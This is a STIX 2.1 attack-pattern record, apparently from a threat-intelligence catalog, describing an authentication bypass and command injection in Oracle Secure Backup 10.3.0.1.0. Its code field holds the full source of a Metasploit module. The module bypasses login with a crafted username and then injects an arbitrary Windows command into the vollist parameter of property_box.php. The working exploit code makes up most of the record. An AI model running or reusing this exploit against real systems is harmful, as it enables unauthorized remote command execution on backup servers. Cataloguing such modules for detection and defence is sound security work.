{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a62cba2-c0d6-4733-8052-efef5b9a0f5e",
    "created": "2024-08-14T16:22:53.071227Z",
    "modified": "2024-08-14T16:22:53.071231Z",
    "name": "Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability",
    "description": " This module exploits an authentication bypass vulnerability in login.php in order to execute arbitrary code via a command injection vulnerability in property_box.php. This module was tested against Oracle Secure Backup version 10.3.0.1.0 (Win32). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/osb_execqr2.rb",
            "external_id": "osb_execqr2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1977"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1978"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability',\n      'Description'    => %q{\n          This module exploits an authentication bypass vulnerability\n          in login.php in order to execute arbitrary code via a command injection\n          vulnerability in property_box.php. This module was tested\n          against Oracle Secure Backup version 10.3.0.1.0 (Win32).\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1977' ],\n          [ 'OSVDB', '55903' ],\n          [ 'CVE', '2009-1978' ],\n          [ 'OSVDB', '55904' ],\n          [ 'ZDI', '09-058' ],\n          [ 'ZDI', '09-059' ],\n        ],\n      'DisclosureDate' => '2009-08-18'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('CMD', [ false, \"The command to execute.\", \"cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\\\metasploit.txt\" ]),\n        OptBool.new('SSL',   [true, 'Use SSL', true]),\n      ])\n  end\n\n  def run\n    cmd = datastore['CMD']\n\n    res = send_request_cgi(\n      {\n        'uri'\t=>  '/login.php',\n        'data'\t=>  'button=Login&attempt=1&mode=&tab=75&uname=-msf&passwd=msf',\n        'method' => 'POST',\n      }, 5)\n\n      if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)\n\n          print_status(\"Sending command: #{datastore['CMD']}...\")\n\n          send_request_cgi(\n            {\n              'uri'\t=> '/property_box.php',\n              'data'  => 'type=Sections&vollist=75' + Rex::Text.uri_encode(\"&\" + cmd),\n              'cookie' => res.get_cookies,\n              'method' => 'POST',\n            }, 5)\n\n          print_status(\"Done.\")\n      else\n        print_error(\"Invalid PHPSESSION token..\")\n        return\n      end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-08-18"
}